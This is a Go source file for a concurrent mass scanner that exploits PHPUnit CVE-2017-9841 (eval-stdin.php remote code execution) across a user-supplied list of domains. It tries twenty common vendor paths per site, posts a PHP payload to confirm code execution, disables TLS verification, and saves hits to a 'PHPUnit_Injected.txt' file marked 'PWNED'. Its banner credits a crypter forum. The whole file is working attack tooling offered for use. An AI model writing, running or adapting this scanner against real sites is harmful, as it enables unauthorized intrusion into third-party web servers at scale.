package main

import (
	"bufio"
	"bytes"
	"crypto/md5"
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	PHPUnit_PayloadList = []string{
		"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/staging/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/portal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/site/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/release/composer/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
	}
	//global config
	client = &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, //same as verify=False
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 100,
			IdleConnTimeout:     30 * time.Second,
		},
	}
	UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"

	count int64
	total int64
)

// func blue(text string) string    { return "\033[1;34m" + text + "\033[0m" }
func red(text string) string     { return "\033[1;31m" + text + "\033[0m" }
func green(text string) string   { return "\033[1;32m" + text + "\033[0m" }
func yellow(text string) string  { return "\033[1;33m" + text + "\033[0m" }
func magenta(text string) string { return "\033[1;35m" + text + "\033[0m" }
func cyan(text string) string    { return "\033[1;36m" + text + "\033[0m" }

// func blue(text string) string    { return "\033[1;34m" + text + "\033[0m" }

// payload := `<?php md5("phpunit") ?>`
// 85af727fd022d3a13e7972fd6a418582

func CleanProtocol(target string) string {
	target = strings.TrimSpace(target) // remove leading/trailing whitespace
	target = strings.TrimPrefix(target, "https://")
	target = strings.TrimPrefix(target, "http://")
	target = strings.TrimSuffix(target, "/") // remove trailing slash
	return target
}
func DetectProtocol(host string) (string, error) {

	Target := CleanProtocol(host)

	// must best HTTPS first
	httpsURL := "https://" + Target
	req1, _ := http.NewRequest("GET", httpsURL, nil)
	req1.Header.Set("User-Agent", UserAgent)
	resp1, err := client.Do(req1)
	if err == nil {
		resp1.Body.Close()
		return httpsURL, nil
	}

	// HTTP
	httpURL := "http://" + Target
	reqhttp, _ := http.NewRequest("GET", httpURL, nil)
	reqhttp.Header.Set("User-Agent", UserAgent)
	reshttp, errr := client.Do(reqhttp)
	if errr == nil {
		reshttp.Body.Close()
		return httpURL, nil
	}

	return "", errr
}

func attack_PHPunit(domain_inj string) (bool, error) {

	if domain_inj == "" {
		return false, nil
	}
	payload := []byte(`<?php echo md5("phpunit"); ?>`)

	input := "phpunit"
	HASH := md5.Sum([]byte(input))
	MD5_ := hex.EncodeToString(HASH[:])

	req_pst, err_pst := http.NewRequest("POST", domain_inj, bytes.NewBuffer(payload))
	req_pst.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req_pst.Header.Set("User-Agent", UserAgent)

	if err_pst != nil {
		return false, nil
	}

	rest, ert := client.Do(req_pst)
	if ert != nil {
		return false, nil
	}
	defer rest.Body.Close()

	body, _ := io.ReadAll(rest.Body)
	if bytes.Contains(body, []byte(MD5_)) {

		return true, nil
	} else {
		return false, nil
	}

}

func attack(HTTP_DOMAIN, progressing string) {
	for _, path_ := range PHPUnit_PayloadList {
		REST_PST, _ := attack_PHPunit(strings.TrimSuffix(HTTP_DOMAIN, "/") + path_)
		if REST_PST {
			fmt.Printf("%s %s ==> %s\n", progressing, green("PHPUnit == PWNED"), HTTP_DOMAIN+path_)
			file_success, _ := os.OpenFile("PHPUnit_Injected.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			defer file_success.Close()
			file_success.WriteString(HTTP_DOMAIN + path_ + "\n")
			break
		} else {
			fmt.Printf("%s %s ==> %s\n", progressing, red("Fail Injection"), HTTP_DOMAIN+path_)
		}
	}
}

func Tasking(domain string) {
	counter := atomic.AddInt64(&count, 1)
	target := strings.TrimSpace(domain)
	HTTP_DOMAIN, err_url := DetectProtocol(target)

	progressing := fmt.Sprintf("[%d/%d]", counter, total)

	if err_url != nil {
		if strings.Contains(err_url.Error(), "tls") {
			fmt.Printf("%s %s ==> http://%s\n", progressing, magenta("Domain Error"), target)
		} else if strings.Contains(err_url.Error(), "timeout") {
			fmt.Printf("%s %s ==> http://%s\n", progressing, yellow("Domain Timeout"), target)
		} else {
			fmt.Printf("%s %s ==> http://%s\n", progressing, red("Domain Offline"), target)
		}
	} else {
		fmt.Printf("%s %s ==> %s\n", progressing, cyan("Domain Online"), HTTP_DOMAIN)
		file, _ := os.OpenFile("Domain_Online.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		defer file.Close()
		file.WriteString(HTTP_DOMAIN + "\n")
		attack(HTTP_DOMAIN, progressing)
	}
}

// Worker goroutine
func worker(jobs <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	for target := range jobs {
		Tasking(target)
	}
}

func banner() {
	fmt.Println()
	fmt.Println("\033[1;34m")
	fmt.Println("  _____  _    _ _____  _    _       _ _      _____       _____                 ")
	fmt.Println(" |  __ \\| |  | |  __ \\| |  | |     (_) |    / ____|     / ____|                ")
	fmt.Println(" | |__) | |__| | |__) | |  | |_ __  _| |_  | |  __  ___| (___   ___ __ _ _ __  ")
	fmt.Println(" |  ___/|  __  |  ___/| |  | | '_ \\| | __| | | |_ |/ _ \\\\___ \\ / __/ _` | '_ \\ ")
	fmt.Println(" | |    | |  | | |    | |__| | | | | | |_  | |__| | (_) |___) | (_| (_| | | | |")
	fmt.Println(" |_|    |_|  |_|_|     \\____/|_| |_|_|\\__|  \\_____|\\___/_____/ \\___\\__,_|_| |_|")
	fmt.Println("\033[1;31m          PHPUnit CVE-2017 - 9841 | Inject Keyword (METHOD) | by Forums DRCrypter.ru")
	fmt.Println("\033[0m")
}
func main() {
	banner()

	List_Targets := flag.String("l", "", "Path Your target *.txt")                //enter list
	Max_Threads := flag.Int("t", 10, "Number of concurrent threads (default 10)") //number threads
	flag.Parse()

	if *List_Targets == "" {
		fmt.Printf("Command: PHPunit_GOScan -l targets.txt -t 10")
		fmt.Println()
		return
	}

	// count lists of target list
	total_lists, err := os.Open(*List_Targets)
	if err != nil {
		fmt.Printf("Err opening total_list: %s", err)
		return
	}

	Scan_Totalist := bufio.NewScanner(total_lists)
	for Scan_Totalist.Scan() {
		total++

	}
	defer total_lists.Close()

	// Mass with function attack
	Targets, err := os.Open(*List_Targets)
	if err != nil {
		fmt.Printf("Err Open target lists: %s", err)
		return
	}

	defer Targets.Close()

	//https://bwoff.medium.com/the-comprehensive-guide-to-concurrency-in-golang-aaa99f8bccf6

	jobs := make(chan string, *Max_Threads)
	var wg sync.WaitGroup

	for i := 0; i < *Max_Threads; i++ {
		wg.Add(1)
		go worker(jobs, &wg)
	}

	Mass_Scan := bufio.NewScanner(Targets)
	for Mass_Scan.Scan() {
		jobs <- Mass_Scan.Text()
	}
	close(jobs)

	wg.Wait()

}
